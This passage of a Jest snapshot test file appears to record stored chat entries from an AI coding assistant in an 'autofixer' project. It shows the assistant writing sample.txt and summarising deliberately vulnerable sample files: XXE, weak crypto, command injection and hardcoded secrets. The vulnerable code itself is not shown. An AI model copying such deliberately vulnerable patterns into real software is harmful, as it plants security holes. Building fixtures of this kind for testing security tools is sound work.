json\\"},{\\"name\\":\\"docker-bake-gha-cache.hcl\\"},{\\"name\\":\\"docker-compose.yml\\"},{\\"name\\":\\"Makefile\\"},{\\"name\\":\\"mypy_ext.ini\\"},{\\"name\\":\\"mypy.ini\\"},{\\"name\\":\\"package.json\\"},{\\"name\\":\\"pnpm-lock.yaml\\"},{\\"name\\":\\"pnpm-workspace.yaml\\"},{\\"name\\":\\"pom.xml\\"},{\\"name\\":\\"readme.md\\"},{\\"name\\":\\"sample-file.txt\\"},{\\"name\\":\\"sample.txt\\"},{\\"name\\":\\"sample2.txt\\"},{\\"name\\":\\"static-analysis.datadog.yml\\"}],\\"childrenWereProcessed\\":true}}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-16 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:99b6071d-54db-4d5a-907b-b04acdf5a3b9",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"99b6071d-54db-4d5a-907b-b04acdf5a3b9","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:08.916Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","serverBubbleId":"304e9aff-da2e-4380-b44a-0b25253954e0","usageUuid":"701535c0-1c34-44e5-8d68-af1b2caa300b","capabilityType":30,"thinking":{"text":"","signature":"qeGsqsYsy1M0Fb88O-gxtz3r-aZ1H12hA5I7Vo32uKIRVhhsZtfr6DUZzIG088LiFVS_qmfrI709HNkMxJeBk_UNQY3kAS1rrp5qEOlikFU4bbm7XrexF402wAAZVBB98x_UiiVwARZrofWoRIPD4lfkclMNL7CYVmh0LR8U2Kx8_xLHuVVwcobFaXFk4Df7n288mhmCshu3sizOq4AwBeJcjcku4C2V8SFTxF-fkyt8p1rzlXtWqXnNj55ozOXxzsi7PAWVB4kj6wZOdNUTw9MzZgLN9jAofZBdUxGwI5jiN23G84Z0StUVOgv6yJKTVLxb79viQX1DlRVc6fe6wIlmZGL0RRwDt5c1jP80wP5Llm9NPCNvNighqinbwIcwqgn-h-2ccEGRqjLYrnxyzfTmm9XP7wItjcoFsowDkvHWR2pDxKdAOeLcD0xYLruq5vUOnCWkixC1C9rReZ3sYpyHfMluSgyMMy5zzc4xWexykDCgEDnxG0iOPgMLQiscMi8eKroyYT9KixtaCOAZBpi_wKjD6ez_rBE48B-QzwmNUHOzsZhhdxJCQp57Lp9E4w2VILkAyR9KxTFfJReiA7OCkvgn1ufEPjm-D0LnEhbOtIJCpioMzYoNE6BBEDgkIGiF-hK7qpXihqjHBWH5uXAFhfR0hmRbp1KW0Fx8p7UzcveJ1gc"},"thinkingDurationMs":2712}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-17 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:54803258-5483-485b-895f-4b0b703781c8",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"54803258-5483-485b-895f-4b0b703781c8","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:13.110Z","isQuickSearchQuery":false,"text":"Creating a sample file in the repo root:\\n","usageUuid":"701535c0-1c34-44e5-8d68-af1b2caa300b"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-18 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:fda8fd24-131d-48f7-a527-d63fd600c14c",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"fda8fd24-131d-48f7-a527-d63fd600c14c","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:13.176Z","isQuickSearchQuery":false,"codeBlocks":[{"uri":{"scheme":"file","authority":"","path":"/Users/jonathanafek/src/autofixer/sample.txt","query":"","fragment":"","_formatted":null,"_fsPath":null},"codeblockId":"e6dce7c8-43e3-466f-8206-8d07703f8333","codeBlockIdx":0,"content":"This is a sample file.\\nYou can use this as a template or example.\\n","languageId":"plaintext"}],"text":"","capabilityType":15,"toolFormerData":{"tool":38,"toolIndex":1,"modelCallId":"7c88ec55-ad81-4856-94e0-32dfeb6722ff","toolCallId":"tool_6b32e8fd-d9f0-4beb-a25f-bcb2f2aeede","status":"completed","rawArgs":"{\\"file_path\\": \\"/Users/jonathanafek/src/autofixer/sample.txt\\", \\"contents\\": \\"This is a sample file.\\\\nYou can use this as a template or example.\\\\n\\"}","name":"write","params":"{\\"relativeWorkspacePath\\":\\"/Users/jonathanafek/src/autofixer/sample.txt\\"}","additionalData":{"codeblockId":"e6dce7c8-43e3-466f-8206-8d07703f8333","reviewData":{"status":"None","selectedOption":"accept","isShowingInput":false,"firstTimeReviewMode":false}},"userDecision":"accepted","result":"{\\"diff\\":{\\"chunks\\":[{\\"diffString\\":\\"- This is a small text file created in the root of the repository.\\\\n- \\\\n+ This is a sample file.\\\\n+ You can use this as a template or example.\\\\n  \\",\\"oldStart\\":1,\\"newStart\\":1,\\"oldLines\\":3,\\"newLines\\":3,\\"linesRemoved\\":2,\\"linesAdded\\":2}],\\"editor\\":\\"EDITOR_AI\\"},\\"shouldAutoFixLints\\":true,\\"resultForModel\\":\\"Wrote contents to /Users/jonathanafek/src/autofixer/sample.txt.\\"}"},"checkpointId":"59edd25c-cc77-4b7d-8109-f9ccbf4cdf1a"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-19 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:c53e4c85-dcd2-48e2-86dd-bdcf292af082",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"c53e4c85-dcd2-48e2-86dd-bdcf292af082","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:13.176Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","serverBubbleId":"e93f0ccb-be96-4f32-9431-bc9d8806494d","usageUuid":"701535c0-1c34-44e5-8d68-af1b2caa300b","capabilityType":30,"thinking":{"text":"","signature":"yfim1GCkMgOzzWFC8N9noynyBRZoLWan4pmgqYlg1a4sYeB42oMcv4fSGWsRbYvP8lM9OlSQf4xbl4XGrz7OPCWIlsVKoyVAnbWPJkyjH18cYYzOWRfwz4HVmWFBjWQqZQ-1deOMex23PaEX1ylGglmkpWd9JA0MElbn0dgnmicOm9nHoPSP6Qg7gGIP3e3-N9hCyn3rP-l-vOtZIPbOA5ebt8rA0he6du4QtRGJul5ITbVm5mCK01LHHx0MwKhdvFWOrfkCeYa6HVlIu-_aPHkr7TGLWj8ZJ36f4Xk4PXzKHrgrEX92AF5HiIdRX9ItTuko34MlDFv7nZQZ62HLIEHERFtLoMX1b1h16tTTTD_Lw1SXfEumqBZI1uAxXBjFEpX24Agvp_20klSxYA-69XrtgkmjNDuzzP9j6RmDZshT_VcDHxnwWRzF_85J7EOk9M4e1gMoPn0AQQwj70smRP871DG8ANUrOcLWtMVNe2WshSZP8-f-w4MtP8WFTy7-daTgdQC6xXAQ7qZ8oi76KhvmuIxghE8biYfXfkV4hRF_ZL72o5zZ9SJMPlotM8bcSNjMxrEuKPYXFpmRRKM9UU6UKx5iM_oRhU0sARixXSbb9Q5u3G4YXuyUzGxCGoZOStyFPH-uQad7LAJSq6X2Q4AW4dwIZzgh_tTIxRlpD_gvJW1I5lTPOEMaudVUPNknu0bdaZAufHGUzag1b0gSg6wQLBpgk1JC9Sugsn5SO5PXElczivTRz5W_uSnZ_OE_KoFm5n3qVwtLpWpLi9aGmRFgM_KS6JXAoWByQXvcjCOtu1wHkUYWhazFbkRLlRnxzgwZShQ_benDdC_t5iZNR-OmVBoWS5_KMrpVhJqaQ3ybNliQ6nJpXDI2A4V2eOP0aAzbM11D7phFx8k9FhBLc_UYdKWJX-mG7giZC43-PNJj1nY08SN5g4MBvQQgSfNCOO3SCS4Y4EjUK5ipEqh4vabB-5-FIVu0miyTTtI1"},"thinkingDurationMs":3542}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-20 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:5f4c8d99-2985-41df-8607-8ee28cfb890c",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"5f4c8d99-2985-41df-8607-8ee28cfb890c","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":10477,"outputTokens":559},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:18.967Z","isQuickSearchQuery":false,"text":"Created \`sample.txt\` in the repo root. Since \`sample.txt\` already exists, it was overwritten. Want a different name or content?","usageUuid":"701535c0-1c34-44e5-8d68-af1b2caa300b"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-21 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:0056c9a5-859b-4b7d-91aa-788a6fdededa",
    "value": "{"_v":3,"type":1,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"0056c9a5-859b-4b7d-91aa-788a6fdededa","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":true,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"7008cc20-7ca4-484f-8129-588d606d6d5b","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[1,3,41,5,6,7,38,8,9,11,12,15,16,18,19,23,24,25,27,28,43,29,30,31,32,34,35,39,40,42,44,45],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[{"relativeWorkspacePath":"sample_python_sqli.py","startLineNumber":1,"lines":[],"languageIdentifier":"","intent":7,"isOnlyIncludedFromFolder":false},{"relativeWorkspacePath":"sample_xss_vulnerable.js","startLineNumber":1,"lines":[],"languageIdentifier":"","intent":7,"isOnlyIncludedFromFolder":false}],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:51:01.028Z","isQuickSearchQuery":false,"richText":"{\\"root\\":{\\"children\\":[{\\"children\\":[{\\"detail\\":0,\\"format\\":0,\\"mode\\":\\"normal\\",\\"style\\":\\"\\",\\"text\\":\\"and 2 more files\\",\\"type\\":\\"text\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"paragraph\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"root\\",\\"version\\":1}}","text":"and 2 more files","editToolSupportsSearchAndReplace":true,"lastTerminalCwd":"/Users/jonathanafek/src/autofixer","modelInfo":{"modelName":"default"},"isNudge":false,"contextWindowStatusAtCreation":{"percentageRemaining":79,"percentageRemainingFloat":79.23400115966797},"skipRendering":false,"isPlanExecution":false,"context":{"composers":[],"quotes":[],"selectedCommits":[],"selectedPullRequests":[],"selectedImages":[],"folderSelections":[],"fileSelections":[],"terminalFiles":[],"selections":[],"terminalSelections":[],"selectedDocs":[],"externalLinks":[],"cursorRules":[],"cursorCommands":[],"uiElementSelections":[],"consoleLogs":[],"mentions":{"notepads":{},"composers":{},"quotes":{},"selectedCommits":{},"selectedPullRequests":{},"gitDiff":[],"gitDiffFromBranchToMain":[],"selectedImages":{},"useWeb":[],"usePlaywrightMcp":[],"folderSelections":{},"fileSelections":{},"terminalFiles":{},"selections":{},"terminalSelections":{},"selectedDocs":{},"externalLinks":{},"useLinterErrors":[],"useDiffReview":[],"useGenerateRules":[],"useContextPicking":[],"useRememberThis":[],"diffHistory":[],"cursorRules":{},"cursorCommands":{},"autoContext":[],"uiElementSelections":{},"consoleLogs":{},"ideEditorsState":[]},"notepads":[]},"checkpointId":"0ef86309-b72a-422f-8233-10df5fdd0ae0"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-22 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:028cac40-7b1c-457d-bbf1-a80e23dd2cbb",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"028cac40-7b1c-457d-bbf1-a80e23dd2cbb","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"19d66020-506e-4654-8846-c494e7103cd9","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-04T17:51:05.123Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","modelInfo":{"modelName":"default"},"timingInfo":{"clientStartTime":129265.89999997616,"clientRpcSendTime":1762278665123,"clientSettleTime":1762278686814,"clientEndTime":1762278686814},"serverBubbleId":"1e41e05e-f14e-4536-8ba9-48022fe92901","usageUuid":"19d66020-506e-4654-8846-c494e7103cd9","capabilityType":30,"thinking":{"text":"","signature":"w9riKRajvXfEqL-ucINKPXcPowqXlkgkTMXyFrf1B8gbd099Dr1lP5zc7tRnifWK6Nzr8FzZBflJPib1DR235jaR0jUx6rcRrsbSlwcTsy7Nslejs5zrDsa9g9vtCLDukdGVpj1KWB_UxBVgW28Qf4qusLIldSDxRsIeAs4y7doaPCgmZ3MTs-RJICU9dmWRuHUR9tXn9_Cpd3gHiOqriEPVJYB6hw"},"thinkingDurationMs":394}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-23 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:02cffbaf-93cb-47bb-96f3-8a1372a9b5de",
    "value": "{"_v":3,"type":1,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"02cffbaf-93cb-47bb-96f3-8a1372a9b5de","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":true,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"19d66020-506e-4654-8846-c494e7103cd9","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[1,41,7,38,8,9,11,12,15,18,19,25,27,43,46,47,29,30,32,34,35,39,40,42,44,45],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-04T17:51:05.081Z","isQuickSearchQuery":false,"richText":"{\\"root\\":{\\"children\\":[{\\"children\\":[{\\"detail\\":0,\\"format\\":0,\\"mode\\":\\"normal\\",\\"style\\":\\"\\",\\"text\\":\\"now let's create another file\\",\\"type\\":\\"text\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"paragraph\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"root\\",\\"version\\":1}}","text":"now let's create another file","editToolSupportsSearchAndReplace":true,"modelInfo":{"modelName":"default"},"isNudge":false,"contextWindowStatusAtCreation":{"percentageRemaining":70,"percentageRemainingFloat":70.4990005493164},"skipRendering":false,"isPlanExecution":false,"context":{"composers":[],"quotes":[],"selectedCommits":[],"selectedPullRequests":[],"selectedImages":[],"folderSelections":[],"fileSelections":[],"terminalFiles":[],"selections":[],"terminalSelections":[],"selectedDocs":[],"externalLinks":[],"cursorRules":[],"cursorCommands":[],"uiElementSelections":[],"consoleLogs":[],"ideEditorsState":true,"mentions":{"notepads":{},"composers":{},"quotes":{},"selectedCommits":{},"selectedPullRequests":{},"gitDiff":[],"gitDiffFromBranchToMain":[],"selectedImages":{},"useWeb":[],"usePlaywrightMcp":[],"folderSelections":{},"fileSelections":{},"terminalFiles":{},"selections":{},"terminalSelections":{},"selectedDocs":{},"externalLinks":{},"useLinterErrors":[],"useDiffReview":[],"useGenerateRules":[],"useContextPicking":[],"useRememberThis":[],"diffHistory":[],"cursorRules":{},"cursorCommands":{},"autoContext":[],"uiElementSelections":{},"consoleLogs":{},"ideEditorsState":[]},"notepads":[]},"checkpointId":"7b355d60-cd31-400e-bc7c-deecc5cd07d5"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-24 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:0373b0ea-305b-4f33-881c-5a466ef7d0e6",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"0373b0ea-305b-4f33-881c-5a466ef7d0e6","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":46146,"outputTokens":1994},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T17:24:06.020Z","isQuickSearchQuery":false,"text":"Created 2 more sample code files:\\n\\n1. **\`sample_xxe_vulnerable.xml\`** — XML External Entity (XXE) vulnerabilities, including:\\n   - Unsafe XML with external entity references that can read local files or make HTTP requests\\n   - Safe XML without external entities\\n   - Safe XML processing guidelines with code examples for Java and Python\\n   - Recommendations for disabling DTD processing and external entities\\n\\n2. **\`sample_weak_crypto.py\`** — Weak cryptography vulnerabilities in Python, including:\\n   - Unsafe use of MD5/SHA1 for password hashing\\n   - Unsafe use of SHA256 without salt\\n   - Unsafe ECB encryption mode\\n   - Hardcoded encryption keys\\n   - Safe use of bcrypt and Argon2 for password hashing\\n   - Safe use of PBKDF2 with proper configuration\\n   - Safe use of AES-GCM for authenticated encryption\\n\\nYou now have 4 sample files covering command injection, hardcoded secrets, XXE, and weak cryptography.","usageUuid":"ddab3976-82af-42b6-8715-6f9b7acb7f3e"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-25 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:0479c335-53be-4397-abc7-e6a80acda689",
